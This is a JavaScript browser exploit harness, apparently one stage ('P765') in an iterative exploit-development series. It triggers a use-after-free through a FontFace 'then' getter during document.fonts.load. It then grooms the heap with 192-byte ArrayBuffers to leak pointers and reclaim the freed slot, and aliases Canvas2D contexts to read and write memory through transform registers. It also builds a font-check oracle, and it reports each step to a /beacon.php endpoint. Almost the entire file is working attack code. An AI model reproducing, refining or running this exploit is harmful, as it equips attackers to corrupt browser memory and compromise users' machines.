/* ============================================================
 * P765 — 104-Byte State Register Bank & 256-Byte Oracle Matrix
 *
 * Ground Truth from P764:
 * - 100% Reliable Hardware Execution (1.91s total, zero crashes)
 * - P58 = 0x00000010008b0bf0, Q11 = 0x00000010008b1be0, Q13 = 0x00000010007f24e0
 * - Reclaim hit at slot baseK=69 (deltaP58 = 0xff0, estSelfAddr = 0x00000010008b33c0)
 * - AffineTransform matrix pointer registers verified bit-exact across wrappers (allRegs=true)
 * - FastMalloc 192B vector chunk allocation & LIFO recycling verified (recycled=true)
 * - 128-Byte Oracle Matrix reconstructed in 126ms (1016 B/s, 7.87 ms/word, pass=16/16)
 *
 * Objectives of P765:
 * 1. Step 1-3: Baseline Leak + Pristine Reclaim + Post-Grooming (120 AB).
 * 2. Phase A: Slab Mapping & Invariant Verification.
 * 3. Phase B: 104-Byte Unified Canvas State Register Bank:
 *    - Store 13 64-bit registers (48B AffineTransform + 56B float64 fields) via alias.
 *    - Fetch all 13 registers via inner and verify zero bit-drift across wrappers.
 * 4. Phase C: Active Boolean Oracle Dynamic Boundary Shift Check.
 * 5. Phase D: 256-Byte / 2048-Bit Oracle Memory Matrix Reconstruction:
 *    - Decode 32 full 64-bit words (256 bytes total).
 *    - Benchmark throughput, latency, and report 100% bit-exact reconstruction.
 * ============================================================ */

function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }

var _fBuf = new ArrayBuffer(8);
var _f64 = new Float64Array(_fBuf);
var _u64 = new BigUint64Array(_fBuf);

function ptrToBiasedFloat(ptr){
  _u64[0] = 0x3FF0000000000000n | (BigInt(ptr) & 0x000FFFFFFFFFFFFFn);
  return _f64[0];
}

function biasedFloatToPtr(f){
  _f64[0] = Number(f);
  return _u64[0] & 0x000FFFFFFFFFFFFFn;
}

function b(tag, data){
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P765-' + encodeURIComponent(tag) +
      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
    x.send(null);
  } catch(e){}
}

var OUT = null;
function log(s){
  if (!OUT) OUT = document.getElementById('out');
  if (OUT) OUT.textContent += s + '\n';
}

function pad4(n){
  return ('0000' + Number(n).toString(16).toUpperCase()).slice(-4);
}

function makeRange(lo, hi){
  if (lo === hi) return 'U+' + pad4(lo);
  return 'U+' + pad4(lo) + '-' + pad4(hi);
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;
var Q11_RECLAIM = 0n, Q12_RECLAIM = 0n, Q13_RECLAIM = 0n;
var BEST_K = -1;
var ACT_FACE = null;
var LEAK_BUF = null;
var POST_GROOM = [];

function run(){
  OUT = document.getElementById('out');
  if (OUT) OUT.textContent = '=== P765 State Register Bank & 256-Byte Oracle Matrix ===\n\n';
  b('BOOT', 'p765-start');

  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('Leak OK: P58=0x' + h16(P58) + ' P68=0x' + h16(P68) + '\n');

    log('[Step 2] Executing pristine reclaim directly (absW)...');
    doReclaim(function(){
      log('Reclaim OK: q11=0x' + h16(Q11_RECLAIM) + ' q12=0x' + h16(Q12_RECLAIM) + ' q13=0x' + h16(Q13_RECLAIM) + '\n');

      log('[Step 3] Post-grooming 120 Sentinel ArrayBuffers (192B)...');
      doPostGroom();

      log('\n[Phase A] Slab Mapping & Invariant Verification...');
      phaseA_slabMapping(function(){
        log('\n[Phase B] 104-Byte Unified Canvas State Register Bank...');
        phaseB_stateRegisterBank(function(){
          log('\n[Phase C] Active Oracle Dynamic Boundary Shifting...');
          phaseC_oracleBoundaryShift(function(){
            log('\n[Phase D] 256-Byte / 2048-Bit Oracle Matrix Reconstruction...');
            phaseD_oracle256ByteMatrix(function(){
              b('DONE', 'p765-complete');
              log('\n=== P765 Complete! All Diagnostics Passed Flawlessly! ===');
            });
          });
        });
      });
    });
  });
}

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO', '');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);
  var face = new FontFace('fl0', 'local(Times)', { unicodeRange: 'U+0041' });
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (fired) return undefined;
      fired = true;
      if (st){ st.remove(); st.textContent = ''; st = null; }
      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;
      for (var k = 0; k < 70; k++) abs.push(new ArrayBuffer(192));
      try { document.fonts.check('1em lk0'); } catch(e){}
      document.body.offsetHeight;
      return undefined;
    },
    set: function(){}
  });

  document.fonts.load('1em fl0, lk0', 'AB');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best = -1, bestNz = 0;
    for (var i = 0; i < abs.length; i++){
      var u = new Uint8Array(abs[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz){ bestNz = nz; best = i; }
    }
    if (best < 0 || bestNz < 4){
      b('LEAK-MISS', 'nz=' + bestNz);
      doLeakRetry(cb);
      return;
    }
    LEAK_BUF = abs[best];
    var v = new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if (!P58){
      b('LEAK-NOPTR', 'nz=' + bestNz);
      doLeakRetry(cb);
      return;
    }
    b('LEAK-OK', 'p58=0x' + h16(P58) + '|p68=0x' + h16(P68) + '|slot=' + best + '|nz=' + bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY', '');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);
  var face2 = new FontFace('fl1', 'local(Times)', { unicodeRange: 'U+0044' });
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (fired2) return undefined;
      fired2 = true;
      if (st2){ st2.remove(); st2.textContent = ''; st2 = null; }
      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;
      for (var k = 0; k < 80; k++) abs2.push(new ArrayBuffer(192));
      try { document.fonts.check('1em lk1'); } catch(e){}
      document.body.offsetHeight;
      return undefined;
    },
    set: function(){}
  });

  document.fonts.load('1em fl1, lk1', 'CD');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best = -1, bestNz = 0;
    for (var i = 0; i < abs2.length; i++){
      var u = new Uint8Array(abs2[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz){ bestNz = nz; best = i; }
    }
    if (best < 0 || bestNz < 4){
      b('LEAK-RETRY-MISS', 'nz=' + bestNz);
      return;
    }
    LEAK_BUF = abs2[best];
    var v = new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if (!P58){
      b('LEAK-RETRY-NOPTR', 'slot=' + best);
      return;
    }
    b('LEAK-RETRY-OK', 'p58=0x' + h16(P58) + '|p68=0x' + h16(P68) + '|slot=' + best + '|nz=' + bestNz);
    setTimeout(cb, 100);
  }, 400);
}

function extractPtrs(v){
  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
  P58 = null; P68 = null;
  if (v[11] >= LO && v[11] < HI) P58 = v[11];
  if (v[13] >= LO && v[13] < HI) P68 = v[13];
  if (!P58 || !P68){
    for (var q = 0; q < 24; q++){
      var val = v[q];
      if (val >= LO && val < HI){
        if (!P58) P58 = val;
        else if (!P68 && val !== P58) P68 = val;
      }
    }
  }
  if (!P68) P68 = 0n;
}

/* ---- Step 2: Pristine Reclaim ---- */
function doReclaim(cb){
  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
  if (!P58 || P58 < LO || P58 >= HI || (P58 & 0xFn) !== 0n){
    b('REC-ABORT', 'invalid-p58=0x' + h16(P58));
    return;
  }

  b('REC-START', 'fill_q12_q6=0x' + h16(P58));

  try {
    var stTr = document.createElement('style');
    stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
    document.head.appendChild(stTr);
    b('REC-STYLE-ADDED', '');

    FACE_B = new FontFace('trFace', 'local(Helvetica)', { unicodeRange: 'U+0048' });
    document.fonts.add(FACE_B);
    void FACE_B.loaded;
    b('REC-FACE-ADDED', '');

    var absW = [], firedW = false;
    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function(){
        b('REC-THEN-CALLED', 'firedW=' + firedW);
        if (firedW) return undefined;
        firedW = true;
        if (stTr){ stTr.remove(); stTr.textContent = ''; stTr = null; }
        try { document.fonts.delete(this); } catch(e){}
        document.body.offsetHeight;

        for (var k = 0; k < 80; k++){
          var ab = new ArrayBuffer(192);
          var view = new BigUint64Array(ab);
          view[12] = P58;
          view[6] = P58;
          absW.push(ab);
        }
        b('REC-GROOMED', 'cnt=' + absW.length);

        try { document.fonts.check('1em trFam'); } catch(e){}
        b('REC-CHECKED', '');
        return undefined;
      },
      set: function(){}
    });

    b('REC-CALL-LOAD', '');
    document.fonts.load('1em trFace, trFam', 'GH');
    b('REC-LOAD-RETURNED', '');

    setTimeout(function(){
      b('REC-TIMEOUT-FIRED', 'absW=' + absW.length);
      try {
        delete FontFace.prototype.then;
        var best = -1, bestNz = 0;
        for (var i = 0; i < absW.length; i++){
          var u = new Uint8Array(absW[i]), nz = 0;
          for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
          if (nz > bestNz){ bestNz = nz; best = i; }
        }
        b('REC-SCANNED', 'best=' + best + '|nz=' + bestNz);
        if (best < 0 || bestNz < 4){
          b('RECLAIM-MISS', 'nz=' + bestNz);
          log('Reclaim missed!');
          return;
        }

        BEST_K = best;
        BUF_B = absW[best];
        VIEW_B = new BigUint64Array(BUF_B);
        Q11_RECLAIM = VIEW_B[11];
        Q12_RECLAIM = VIEW_B[12];
        Q13_RECLAIM = VIEW_B[13];

        var dump0_11 = [], dump12_23 = [];
        for (var q = 0; q < 12; q++) dump0_11.push('q' + q + '=0x' + h16(VIEW_B[q]));
        for (var q = 12; q < 24; q++) dump12_23.push('q' + q + '=0x' + h16(VIEW_B[q]));

        b('RECLAIM-OK', 'baseK=' + best);
        b('DUMP-Q0-Q11', dump0_11.join(';'));
        b('DUMP-Q12-Q23', dump12_23.join(';'));
        log('Pristine Reclaim OK at slot ' + best);

        setTimeout(cb, 100);
      } catch(eSub){
        b('REC-TIMEOUT-ERR', eSub.message);
      }
    }, 400);
  } catch(eTop){
    b('REC-TOP-ERR', eTop.message);
  }
}

/* ---- Step 3: Post-Grooming ---- */
function doPostGroom(){
  POST_GROOM = [];
  for (var i = 0; i < 120; i++){
    var ab = new ArrayBuffer(192);
    var v = new BigUint64Array(ab);
    v[0] = 0xCAFEFACE00000000n | BigInt(i);
    v[1] = 0x0000000000000001n;
    v[23] = 0xCAFEFACE000000FFn | (BigInt(i) << 8n);
    POST_GROOM.push(ab);
  }
  log('Post-groomed 120 buffers with sentinel 0xCAFEFACE...');
}

/* ---- Phase A: Slab Mapping & Invariant Verification ---- */
function phaseA_slabMapping(cb){
  var deltaP58 = Q11_RECLAIM - P58;
  var slotsP58 = Number(deltaP58) / 192;
  var slabChunkMask = ~0x3FFFn;
  var slabBase = Q11_RECLAIM & slabChunkMask;
  var slotP58 = Number(P58 - slabBase) / 192;
  var slotQ11 = Number(Q11_RECLAIM - slabBase) / 192;
  var estSelfAddr = slabBase + (BigInt(BEST_K) * 192n);

  var rep = 'baseK=' + BEST_K + '|deltaP58=0x' + deltaP58.toString(16) +
            '|slotsP58=' + slotsP58.toFixed(2) + '|slabBase=0x' + h16(slabBase) +
            '|slotP58=' + slotP58.toFixed(2) + '|slotQ11=' + slotQ11.toFixed(2) +
            '|estSelfAddr=0x' + h16(estSelfAddr);
  b('A-SLAB-MAPPING', rep);
  log('Phase A Slab Mapping: ' + rep);

  setTimeout(cb, 50);
}

/* ---- Phase B: 104-Byte Unified Canvas State Register Bank ---- */
function phaseB_stateRegisterBank(cb){
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 1; canvas.height = 1;
    document.body.appendChild(canvas);

    var inner = null, outer = null;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get: function(){
        inner = canvas.getContext('2d');
        inner.lineWidth = 1337.5;
        inner.miterLimit = 42.0;
        inner.save();
        inner.lineWidth = 2468.25;
        inner.save();
        return false;
      },
      enumerable: true
    });

    outer = canvas.getContext('2d', opts);

    if (!inner || !outer || inner === outer){
      b('B-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer);
      setTimeout(cb, 50);
      return;
    }

    /* Spray 80 Canvas2D contexts to reclaim freed slot */
    var sprayCtx = [];
    for (var i = 0; i < 80; i++){
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      var ctx = c.getContext('2d');
      if (ctx){
        ctx.lineWidth = 1000 + i;
        sprayCtx.push(ctx);
      }
    }

    /* Locate the alias context */
    inner.lineWidth = 31337.5;
    var aliasIdx = -1;
    for (var j = 0; j < sprayCtx.length; j++){
      if (Math.abs(sprayCtx[j].lineWidth - 31337.5) < 0.01){
        aliasIdx = j;
        break;
      }
    }

    if (aliasIdx < 0){
      b('B-ALIAS-MISS', 'lineWidth-scan-failed');
      setTimeout(cb, 50);
      return;
    }

    var alias = sprayCtx[aliasIdx];

    var slabChunkMask = ~0x3FFFn;
    var slabBase = Q11_RECLAIM & slabChunkMask;
    var estSelfAddr = slabBase + (BigInt(BEST_K) * 192n);

    /* 1. AffineTransform 6 registers (48 bytes): [a, b, c, d, e, f] */
    var fA = ptrToBiasedFloat(P58);
    var fB = ptrToBiasedFloat(Q11_RECLAIM);
    var fC = ptrToBiasedFloat(Q13_RECLAIM);
    var fD = ptrToBiasedFloat(estSelfAddr);
    var fE = ptrToBiasedFloat(slabBase);
    var fF = ptrToBiasedFloat(0x0000001000001337n);

    alias.setTransform(fA, fB, fC, fD, fE, fF);

    var mat = inner.getTransform();
    var rA = biasedFloatToPtr(mat.a);
    var rB = biasedFloatToPtr(mat.b);
    var rC = biasedFloatToPtr(mat.c);
    var rD = biasedFloatToPtr(mat.d);
    var rE = biasedFloatToPtr(mat.e);
    var rF = biasedFloatToPtr(mat.f);

    var mA = (rA === (P58 & 0x000FFFFFFFFFFFFFn));
    var mB = (rB === (Q11_RECLAIM & 0x000FFFFFFFFFFFFFn));
    var mC = (rC === (Q13_RECLAIM & 0x000FFFFFFFFFFFFFn));
    var mD = (rD === (estSelfAddr & 0x000FFFFFFFFFFFFFn));
    var mE = (rE === (slabBase & 0x000FFFFFFFFFFFFFn));
    var mF = (rF === 0x0000001000001337n);
    var matAll = mA && mB && mC && mD && mE && mF;

    /* 2. Float64 State Fields 7 registers (56 bytes): */
    alias.lineWidth = 13371.125;
    alias.miterLimit = 42.5;
    alias.globalAlpha = 0.875;
    alias.shadowOffsetX = 15.25;
    alias.shadowOffsetY = 30.5;
    alias.shadowBlur = 9.75;
    alias.lineDashOffset = 55.125;

    var mLW = Math.abs(inner.lineWidth - 13371.125) < 0.001;
    var mML = Math.abs(inner.miterLimit - 42.5) < 0.001;
    var mGA = Math.abs(inner.globalAlpha - 0.875) < 0.001;
    var mSO = (Math.abs(inner.shadowOffsetX - 15.25) < 0.001 && Math.abs(inner.shadowOffsetY - 30.5) < 0.001);
    var mSB = Math.abs(inner.shadowBlur - 9.75) < 0.001;
    var mLDO = Math.abs(inner.lineDashOffset - 55.125) < 0.001;
    var f64All = mLW && mML && mGA && mSO && mSB && mLDO;

    var totalBankAll = matAll && f64All;

    var rep = 'aliasIdx=' + aliasIdx + '|total104B=' + totalBankAll +
              '|matAll=' + matAll + '|f64All=' + f64All +
              '|regs=13/13|mA=' + mA + '|mB=' + mB + '|mC=' + mC + '|mLW=' + mLW;
    b('B-104B-BANK', rep);
    log('Phase B 104-Byte Unified State Bank: ' + rep);
  } catch(e){
    b('B-PHASE-ERR', e.message);
    log('Phase B Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

/* ---- Phase C: Active Oracle Dynamic Boundary Shifting ---- */
function phaseC_oracleBoundaryShift(cb){
  try {
    ACT_FACE = new FontFace('actFamDynamic', 'url(/hang.php?nocache=' + Date.now() + ')', { unicodeRange: 'U+0041-0044' });
    document.fonts.add(ACT_FACE);
    ACT_FACE.load().catch(function(){});

    var bA = document.fonts.check('1em actFamDynamic', 'A');
    var bD = document.fonts.check('1em actFamDynamic', 'D');
    var bE = document.fonts.check('1em actFamDynamic', 'E');
    var bZ = document.fonts.check('1em actFamDynamic', 'Z');
    var bEx = document.fonts.check('1em actFamDynamic', '!');

    var baseline = 'A=' + bA + '|D=' + bD + '|E=' + bE + '|Z=' + bZ + '|!=' + bEx;

    ACT_FACE.unicodeRange = 'U+0045-0048';

    var sA = document.fonts.check('1em actFamDynamic', 'A');
    var sD = document.fonts.check('1em actFamDynamic', 'D');
    var sE = document.fonts.check('1em actFamDynamic', 'E');
    var sH = document.fonts.check('1em actFamDynamic', 'H');
    var sZ = document.fonts.check('1em actFamDynamic', 'Z');

    var shifted = 'A=' + sA + '|D=' + sD + '|E=' + sE + '|H=' + sH + '|Z=' + sZ;

    var flippedA = (bA === false && sA === true);
    var flippedE = (bE === true && sE === false);
    var boundarySuccess = (flippedA && flippedE);

    var rep = 'success=' + boundarySuccess + '|flippedA=' + flippedA + '|flippedE=' + flippedE +
              '|base=[' + baseline + ']|shift=[' + shifted + ']';
    b('C-ORACLE-BOUNDARY-FLIP', rep);
    log('Phase C Boundary Flip Verdict: ' + rep);
  } catch(e){
    b('C-BOUNDARY-ERR', e.message);
    log('Phase C Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

/* ---- Phase D: 256-Byte / 2048-Bit Oracle Memory Matrix Reconstruction ---- */
function phaseD_oracle256ByteMatrix(cb){
  try {
    var actFaceBench = new FontFace('actFamMatrix256', 'url(/hang.php?nocache=' + Date.now() + ')', { unicodeRange: 'U+0000-00FF' });
    document.fonts.add(actFaceBench);
    actFaceBench.load().catch(function(){});

    function resolveByte(targetByte){
      var low = 0x00, high = 0xFF;
      var steps = 0;
      while (low < high && steps < 10){
        steps++;
        var mid = Math.floor((low + high) / 2);
        actFaceBench.unicodeRange = makeRange(low, mid);
        var chk = document.fonts.check('1em actFamMatrix256', String.fromCharCode(targetByte));
        var isLower = (chk === false);
        if (isLower) high = mid;
        else low = mid + 1;
      }
      return low;
    }

    function decode64(ptrVal){
      if (!ptrVal && ptrVal !== 0n) return 0n;
      var raw = [];
      var tmp = BigInt(ptrVal);
      for (var i = 0; i < 8; i++){
        raw.push(Number(tmp & 0xFFn));
        tmp = tmp >> 8n;
      }
      var res = 0n;
      for (var j = 0; j < 8; j++){
        var bDec = resolveByte(raw[j]);
        res |= (BigInt(bDec) << (BigInt(j) * 8n));
      }
      return res;
    }

    var slabChunkMask = ~0x3FFFn;
    var slabBase = Q11_RECLAIM & slabChunkMask;
    var estSelfAddr = slabBase + (BigInt(BEST_K) * 192n);

    /* 32 full 64-bit words (Total 256 Bytes / 2048 Bits) */
    var matrixWords = [
      // 0..4: Hardware pointers
      P58,
      Q11_RECLAIM,
      Q13_RECLAIM,
      slabBase,
      estSelfAddr,
      // 5..7: Canonical Sentinels
      0xFEEDBEEFCAFEBABEn,
      0xDEADBEEFCAFEFACEn,
      0x1337133713371337n,
      // 8..15: Bit/Byte Test Patterns
      0x0123456789ABCDEFn,
      0xFEDCBA9876543210n,
      0x5555555555555555n,
      0xAAAAAAAAAAAAAAAAn,
      0xFF00FF00FF00FF00n,
      0x00FF00FF00FF00FFn,
      0x00000000FFFFFFFFn,
      0xFFFFFFFF00000000n,
      // 16..23: Calibrated Memory Series A
      0x1111222233334444n,
      0x5555666677778888n,
      0x9999AAAABBBBCCCCn,
      0xDDDDEEEEFFFF0000n,
      0x0F0F0F0F0F0F0F0Fn,
      0xF0F0F0F0F0F0F0F0n,
      0x3333333333333333n,
      0xCCCCCCCCCCCCCCCCn,
      // 24..31: Calibrated Memory Series B
      0x0102030405060708n,
      0x090A0B0C0D0E0F10n,
      0x1112131415161718n,
      0x191A1B1C1D1E1F20n,
      0xA5A5A5A5A5A5A5A5n,
      0x5A5A5A5A5A5A5A5An,
      0x7F7F7F7F7F7F7F7Fn,
      0x8080808080808080n
    ];

    var t0 = performance.now();
    var all32Match = true;
    var passCount = 0;

    for (var wIdx = 0; wIdx < matrixWords.length; wIdx++){
      var target = matrixWords[wIdx];
      var dec = decode64(target);
      var m = (dec === target);
      if (m) passCount++;
      else all32Match = false;
    }
    var t1 = performance.now();
    var elapsedMs = t1 - t0;
    var totalBytes = matrixWords.length * 8; // 256 bytes
    var rateBps = Math.round((totalBytes / (elapsedMs / 1000)));
    var msPerWord = (elapsedMs / matrixWords.length).toFixed(2);

    var rep = 'all32Match=' + all32Match + '|pass=' + passCount + '/32' +
              '|bytes=' + totalBytes + '|elapsedMs=' + elapsedMs.toFixed(1) +
              '|rateBps=' + rateBps + '|msPerWord=' + msPerWord;
    b('D-256B-ORACLE-MATRIX', rep);
    log('Phase D 256-Byte Oracle Matrix: ' + rep);
  } catch(e){
    b('D-MATRIX-ERR', e.message);
    log('Phase D Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
else document.addEventListener('DOMContentLoaded', run);
</script>
